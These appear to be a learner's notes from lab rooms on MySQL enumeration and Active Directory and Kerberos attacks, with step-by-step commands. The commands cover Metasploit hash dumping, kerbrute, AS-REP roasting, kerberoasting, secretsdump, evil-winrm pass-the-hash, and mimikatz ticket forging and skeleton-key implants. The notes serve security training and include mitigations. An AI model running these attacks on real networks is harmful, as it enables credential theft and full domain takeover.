MySQL creates a database for storing and manipulating data, defining the relationship of each table.
Clients make requests by making specific statements in SQL.
The server will respond to the client with whatever information has been requested.
What runs MySQL?

MySQL can run on various platforms, whether it's Linux or windows. It is commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack, which includes: Linux, Apache, MySQL, and PHP.

More Information:

Here are some resources that explain the technical implementation, and working of, MySQL in more detail than I have covered here:

https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html 

https://www.w3schools.com/php/php_mysql_intro.asp

##Enumerating MySQL

Let's Get Started

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, as this can take up to five minutes, so be patient!

When you would begin attacking MySQL

MySQL is likely not going to be the first point of call when getting initial information about the server. You can, as we have in previous tasks, attempt to brute-force default account passwords if you really don't have any other information; however, in most CTF scenarios, this is unlikely to be the avenue you're meant to pursue.

The Scenario

Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. As this room focuses on exploiting and enumerating the network service, for the sake of the scenario, we're going to assume that you found the credentials: "root:password" while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.

Requirements

You will want to have MySQL installed on your system to connect to the remote MySQL server. In case this isn't already installed, you can install it using 

sudo apt install default-mysql-client


Don't worry- this won't install the server package on your system- just the client.

Again, we're going to be using Metasploit for this; it's important that you have Metasploit installed, as it is by default on both Kali Linux and Parrot OS.

Alternatives

As with the previous task, it's worth noting that everything we will be doing using Metasploit can also be done either manually or with a set of non-Metasploit tools such as nmap's mysql-enum script: https://nmap.org/nsedoc/scripts/mysql-enum.html or https://www.exploit-db.com/exploits/23081. I recommend that after you complete this room, you go back and attempt it manually to make sure you understand the process that is being used to display the information you acquire.

To connect to MySQL database use command:

 mysql -h [IP] -u [username] -p
 
 
Launch up Metasploit.

We're going to be using the "mysql_sql" module.

Search for, select and list the options it needs. What three options do we need to set? (in descending order).

password/rhosts/username

Set the options and run the exploit.

Change the "sql" option to "show databases"

The SQL options can run the SQL script on the target's database.

##We know:

1. MySQL server credentials

2. The version of MySQL running

3. The number of Databases, and their names.

Key Terminology

In order to understand the exploits we're going to use next- we need to understand a few key terms.

Schema:

In MySQL, physically, a schema is synonymous with a database. You can substitute the keyword "SCHEMA" instead of DATABASE in MySQL SQL syntax, for example using CREATE SCHEMA instead of CREATE DATABASE. It's important to understand this relationship because some other database products draw a distinction. For example, in the Oracle Database product, a schema represents only a part of a database: the tables and other objects owned by a single user.

Hashes:

Hashes are, very simply, the product of a cryptographic algorithm to turn a variable length input into a fixed length output.

In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data. This creates an index that is significantly smaller than the original data, allowing the values to be searched and accessed more efficiently

However, the data we're going to be extracting are password hashes which are simply a way of storing passwords not in plaintext format.

First, let's search for and select the "mysql_schemadump" module. What's the module's full name?

auxiliary/scanner/mysql/mysql_schemadump

Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. 

Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql_hashdump" module. What's the module's full name?
auxiliary/scanner/mysql/mysql_hashdum
Thanks to that we can see users in the database.

carl

Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called "hash.txt".

What is the user/hash combination string?

carl:*EA031893AA21444B170FC2162A56978B8CEECE18

Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt" what is the password of the user we found?

doggie
Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service?

Can be used to connect using SSH


##Active Directory exploitation 

What is Active Directory? - 

Active Directory is a collection of machines and servers connected inside of domains, that are a collective part of a bigger forest of domains, that make up the Active Directory network. Active Directory contains many functioning bits and pieces, a majority of which we will be covering in the upcoming tasks. To outline what we'll be covering take a look over this list of Active Directory components and become familiar with the various pieces of Active Directory: 

Domain Controllers
Forests, Trees, Domains
Users + Groups 
Trusts
Policies 
Domain Services
All of these parts of Active Directory come together to make a big network of machines and servers. Now that we know what Active Directory is let's talk about the why?

Why use Active Directory? -

The majority of large companies use Active Directory because it allows for the control and monitoring of their user's computers through a single domain controller. It allows a single user to sign in to any computer on the active directory network and have access to his or her stored files and folders in the server, as well as the local storage on that machine. This allows for any user in the company to use any machine that the company owns, without having to set up multiple users on a machine. Active Directory does it all for you.

The physical Active Directory is the servers and machines on-premise, these can be anything from domain controllers and storage servers to domain user machines; everything needed for an Active Directory environment besides the software.



Image Credit

Domain Controllers -

﻿A domain controller is a Windows server that has Active Directory Domain Services (AD DS) installed and has been promoted to a domain controller in the forest. Domain controllers are the center of Active Directory -- they control the rest of the domain. I will outline the tasks of a domain controller below: 

holds the AD DS data store 
handles authentication and authorization services 
replicate updates from other domain controllers in the forest
Allows admin access to manage domain resources


Image Credit

AD DS Data Store - 

The Active Directory Data Store holds the databases and processes needed to store and manage directory information such as users, groups, and services. Below is an outline of some of the contents and characteristics of the AD DS Data Store:

Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users
Stored by default in %SystemRoot%\NTDS
accessible only by the domain controller

﻿The forest is what defines everything; it is the container that holds all of the other bits and pieces of the network together -- without the forest all of the other trees and domains would not be able to interact. The one thing to note when thinking of the forest is to not think of it too literally -- it is a physical thing just as much as it is a figurative thing. When we say "forest", it is only a way of describing the connection created between these trees and domains by the network.


﻿Forest Overview -

﻿﻿A forest is a collection of one or more domain trees inside of an Active Directory network. It is what categorizes the parts of the network as a whole.

The Forest consists of these parts which we will go into farther detail with later:

Trees - A hierarchy of domains in Active Directory Domain Services
Domains - Used to group and manage objects 
Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
Trusts - Allows users to access resources in other domains
Objects - users, groups, printers, computers, shares
Domain Services - DNS Server, LLMNR, IPv6
Domain Schema - Rules for object creation

The users and groups that are inside of an Active Directory are up to you; when you create a domain controller it comes with default groups and two default users: Administrator and guest. It is up to you to create new users and create new groups to add users to.


Image by raphaelsilva from Pixabay

Users Overview - 

﻿Users are the core to Active Directory; without users why have Active Directory in the first place? There are four main types of users you'll find in an Active Directory network; however, there can be more depending on how a company manages the permissions of its users. The four types of users are: 

Domain Admins - This is the big boss: they control the domains and are the only ones with access to the domain controller.
Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization.


Image by raphaelsilva from Pixabay

Groups Overview - 

﻿Groups make it easier to give permissions to users and objects by organizing them into groups with specified permissions. There are two overarching types of Active Directory groups: 

Security Groups - These groups are used to specify permissions for a large number of users
Distribution Groups - These groups are used to specify email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration
Default Security Groups - 

﻿There are a lot of default security groups so I won't be going into too much detail of each past a brief description of the permissions that they offer to the assigned group. Here is a brief outline of the security groups:

Domain Controllers - All domain controllers in the domain
Domain Guests - All domain guests
Domain Users - All domain users
Domain Computers - All workstations and servers joined to the domain
Domain Admins - Designated administrators of the domain
Enterprise Admins - Designated administrators of the enterprise
Schema Admins - Designated administrators of the schema
DNS Admins - DNS Administrators Group
DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
Group Policy Creator Owners - Members in this group can modify group policy for the domain
Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
Cert Publishers - Members of this group are permitted to publish certificates to the directory
Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
Key Admins - Members of this group can perform administrative actions on key objects within the domain.
Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
RAS and IAS Servers - Servers in this group can access remote access properties of users.

Trusts and policies go hand in hand to help the domain and trees communicate with each other and maintain "security" inside of the network. They put the rules in place of how the domains inside of a forest can interact with each other, how an external forest can interact with the forest, and the overall domain rules or policies that a domain must follow.

Domain Trusts Overview -

﻿Trusts are a mechanism in place for users in the network to gain access to other resources in the domain. For the most part, trusts outline the way that the domains inside of a forest communicate to each other, in some environments trusts can be extended out to external domains and even forests in some cases.



There are two types of trusts that determine how the domains communicate. I'll outline the two types of trusts below: 

Directional - The direction of the trust flows from a trusting domain to a trusted domain
Transitive - The trust relationship expands beyond just two domains to include other trusted domains
The type of trusts put in place determines how the domains and trees in a forest are able to communicate and send data to and from each other when attacking an Active Directory environment you can sometimes abuse these trusts in order to move laterally throughout the network. 

Domain Policies Overview - 

Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active  Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely. Along with the very long list of default domain policies, domain admins can choose to add in their own policies not already on the domain controller, for example: if you wanted to disable windows defender across all machines on the domain you could create a new group policy object to disable Windows Defender. The options for domain policies are almost endless and are a big factor for attackers when enumerating an Active Directory network. I'll outline just a few of the  many policies that are default or you can create in an Active Directory environment: 

Disable Windows Defender - Disables windows defender across all machine on the domain
Digitally Sign Communication (Always) - Can disable or enable SMB signing on the domain controller

The Active Directory domain services are the core functions of an Active Directory network; they allow for management of the domain, security certificates, LDAPs, and much more. This is how the domain controller decides what it wants to do and what services it wants to provide for the domain.

Domain Services Overview - 

Domain Services are exactly what they sound like. They are services that the domain controller provides to the rest of the domain or tree. There is a wide range of various services that can be added to a domain controller; however, in this room we'll only be going over the default services that come when you set up a Windows server as a domain controller. Outlined below are the default domain services: 

LDAP - Lightweight Directory Access Protocol; provides communication between applications and directory services
Certificate Services - allows the domain controller to create, validate, and revoke public key certificates
DNS, LLMNR, NBT-NS - Domain Name Services for identifying IP hostnames
Domain Authentication Overview - 

The most important part of Active Directory -- as well as the most vulnerable part of Active Directory -- is the authentication protocols set in place. There are two main types of authentication in place for Active Directory: NTLM and Kerberos. Since these will be covered in more depth in later rooms we will not be covering past the very basics needed to understand how they apply to Active Directory as a whole. For more information on NTLM and Kerberos check out the Attacking Kerberos room - https://tryhackme.com/room/attackingkerberos.

Kerberos - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.
NTLM - default Windows authentication protocol uses an encrypted challenge/response protocol
The Active Directory domain services are the main access point for attackers and contain some of the most vulnerable protocols for Active Directory, this will not be the last time you see them mentioned in terms of Active Directory security.


##Kerbrute

Installing Kebrute:

git clone https://github.com/Sq00ky/attacktive-directory-tools.git

	chmod u=rwx kerbrute 
	chmod +x kerbrute 
Used to bruteforce usernames and passwords for Active Directory 

Usage:
kerbrute userenum [flags] <username_wordlist>

Flags:
  -h, --help   help for userenum

Global Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

./kerbrute userenum --dc 10.10.86.29 -d spookysec.local userlist.txt

./kerberos userenum --dc <IP> -d <domain name> <text file with user names>

##Enumeration 
##ASREPRoasting to get hashes off passwords which does not require  pre authentication.

 GetNPUsers.py -no-pass -dc-ip 10.10.71.93 spookysec.local/svc-admin
 GetNPUsers.py -no-pass -dc-ip <IP> <domain>/<username>
 
 #SMBClient
 Use \\ to specify folders, same as \. Use it to discover different shares.
 
 smbclient \\\\10.10.6.165\\backup -U "svc-admin"
 
 ##secretdymp
 
 Use secretsdump to get password hashes by using domain name used from smbclient
 
 python3 /opt/impacket/examples/secretsdump.py  spookysec.local/backup:backup2517860@10.10.6.165
 
 Look for highly privileged users nthash value (NTLM hash) which is the hashed password 
 
 ##evilwinrm
 
 Installation 
 sudo gem install evil-winrm
 
 Usage:
  evil-winrm -i 10.10.6.165 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
  evil-winrm -i <IP> -u <user> -H <password hash>
 
 ##Attacking Kerberos
 
 Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

Common Terminology -  

Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.
AS-REQ w/ Pre-Authentication In Detail - 

The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

Ticket Granting Ticket Contents -

In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.



Service Ticket Contents - 

To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.


Kerberos Authentication Overview -



AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.

AP-REP - 6.) The service grants access

Kerberos Tickets Overview - 

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

Attack Privilege Requirements -

Kerbrute Enumeration - No domain access required 
Pass the Ticket - Access as a user to the domain required
Kerberoasting - Access as any user required
AS-REP Roasting - Access as any user required
Golden Ticket - Full domain compromise (domain admin) required 
Silver Ticket - Service hash required 
Skeleton Key - Full domain compromise (domain admin) required

##Kerberos enumeration

ou need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - MACHINE_IP  CONTROLLER.local    

Abusing Pre-Authentication Overview -

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

Kerbrute Installation - 

1.) Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases

2.) Rename kerbrute_linux_amd64 to kerbrute

3.) chmod +x kerbrute - make kerbrute executable

Enumerating Users w/ Kerbrute -

Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.

1.) cd into the directory that you put Kerbrute

2.) Download the wordlist to enumerate with here

3.) ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt - This will brute force user accounts from a domain controller using a supplied wordlist

##Brute forcing tickets - requires access to any account

beus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - https://github.com/GhostPack/Rubeus

Rubeus is already compiled and on the target machine.



Harvesting Tickets w/ Rubeus - 

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

1.) cd Downloads - navigate to the directory Rubeus is in

2.) Rubeus.exe harvest /interval:30 - This command tells Rubeus to harvest for TGTs every 30 seconds



Brute-Forcing / Password-Spraying w/ Rubeus -

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 

echo <IP> <Domain name> >> C:\Windows\System32\drivers\etc\hosts

1.) cd Downloads - navigate to the directory Rubeus is in

2.) Rubeus.exe brute /password:Password1 /noticket - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 

Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.

##Kerberoasing

﻿﻿In this task we'll be covering one of the most popular Kerberos attacks - Kerberoasting. Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.

In order to perform the attack, we'll be using both Rubeus as well as Impacket so you understand the various tools out there for Kerberoasting. There are other tools out there such a kekeo and Invoke-Kerberoast but I'll leave you to do your own research on those tools.

I have already taken the time to put Rubeus on the machine for you, it is located in the downloads folder.



Method 1 - Rubeus

Kerberoasting w/ Rubeus - 

1.) cd Downloads - navigate to the directory Rubeus is in

2.) Rubeus.exe kerberoast This will dump the Kerberos hash of any kerberoastable users    


copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat

I have created a modified rockyou wordlist in order to speed up the process download it here 

3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

Method 2 - Impacket

Impacket Installation - 

Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20

1.) cd /opt navigate to your preferred directory to save tools in 

2.) download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19

3.) cd Impacket-0.9.19 navigate to the impacket directory

4.) pip install . - this will install all needed dependencies

Kerberoasting w/ Impacket - 

1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located

2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash

What Can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.

Mitigation - Defending the Forest



Kerberoasting Mitigation -

 Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
 Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.
 
 ##AS-REP Roasting 
 
 Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

We'll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we'll use hashcat in order to crack the krbasrep5 hash.

There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.

I have already compiled and put Rubeus on the machine.

AS-REP Roasting Overview - 

During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.



Dumping KRBASREP5 Hashes w/ Rubeus -

1.) cd Downloads - navigate to the directory Rubeus is in

2.) Rubeus.exe asreproast - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.



Crack those Hashes w/ hashcat - 

1.) Transfer the hash from the target machine over to your attacker machine and put the hash into a txt file

2.) Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....

Use the same wordlist that you downloaded in task 4

3.) hashcat -m 18200 hash.txt Pass.txt - crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200 



AS-REP Roasting Mitigations - 

Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

##Mimikatz

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to dump a TGT from LSASS memory

This will only be an overview of how the pass the ticket attacks work as THM does not currently support networks but I challenge you to configure this on your own network.

You can run this attack on the given machine however you will be escalating from a domain admin to a domain admin because of the way the domain controller is set up.

Pass the Ticket Overview - 

Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.



Prepare Mimikatz & Dump Tickets - 

You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.

1.) cd Downloads - navigate to the directory mimikatz is in

2.) mimikatz.exe - run mimikatz

3.) privilege::debug - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz



4.) sekurlsa::tickets /export - this will export all of the .kirbi tickets into the directory that you are currently in

At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier



When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red above.

Pass the Ticket w/ Mimikatz

Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.

1.) kerberos::ptt <ticket> - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket



2.) klist - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.

We will not be using mimikatz for the rest of the attack.



3.) You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.



Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind of engagement you're in so do not take this as a definitive guide of how to run this attack.

Pass the Ticket Mitigation -

Let's talk blue team and how to mitigate these types of attacks. 

Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

##Golden and Silver ticket mimikatz

Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however well be using mimikatz in order to create a silver ticket.

A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

KRBTGT Overview 

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.

Golden/Silver Ticket Attack Overview - 

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.



Dump the krbtgt hash -

﻿1.) cd downloads && mimikatz.exe - navigate to the directory mimikatz is in and run mimikatz

2.) privilege::debug - ensure this outputs [privilege '20' ok]

﻿3.) lsadump::lsa /inject /name:krbtgt - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.



Create a Golden/Silver Ticket - 

﻿1.) Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: - This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

I'll show you a demo of creating a golden ticket it is up to you to create a silver ticket.



Use the Golden/Silver Ticket to access other machines -

﻿1.) misc::cmd - this will open a new elevated command prompt with the given ticket in mimikatz.



2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.



This attack will not work without other machines on the domain however I challenge you to configure this on your own network and try out these attacks.

##Skeleton key 

Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password. 

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption. 

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"

This will only be an overview section and will not require you to do anything on the machine however I encourage you to continue yourself and add other machines and test using skeleton keys with mimikatz.

Skeleton Key Overview -

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.



Preparing Mimikatz - 

1.) cd Downloads && mimikatz.exe - Navigate to the directory mimikatz is in and run mimikatz

2.) privilege::debug - This should be a standard for running mimikatz as mimikatz needs local administrator access



Installing the Skeleton Key w/ mimikatz -

1.) misc::skeleton - Yes! that's it but don't underestimate this small command it is very powerful



Accessing the forest - 

The default credentials will be: "mimikatz"

example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password

